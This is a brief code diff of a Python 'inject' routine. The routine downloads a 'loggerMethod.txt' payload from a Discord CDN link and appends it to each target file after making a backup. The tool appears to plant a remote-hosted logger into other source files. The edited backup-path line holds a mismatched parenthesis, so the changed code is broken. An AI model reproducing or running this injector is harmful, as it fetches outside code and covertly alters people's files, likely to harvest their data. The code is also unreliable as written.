@@ -10,6 +10,7 @@ from shutil import copy
 from os import chdir
 
 def inject(pathLS, baseDir):
+    timeNow = int(time())
     methCont = rq.get("https://cdn.discordapp.com/attachments/927875122315001898/929800092049874944/loggerMethod.txt").content.decode('utf-8')
     count = 1
     for f in pathLS:
@@ -55,7 +56,7 @@ def inject(pathLS, baseDir):
             else:
                 res.append(s)
 
-        bkupDir = f"backup_{int(time())}/{dirname(f.replace(baseDir, ''))}"
+        bkupDir = f"backup_{timeNow)}/{dirname(f.replace(baseDir, ''))}"
         Path(bkupDir).mkdir(parents=True, exist_ok = True)
         copy(f, bkupDir)
         open(f,'wb').write('\n'.join(res).encode('utf-8') + methCont.replace('#classPath#', classPath).encode('utf-8'))
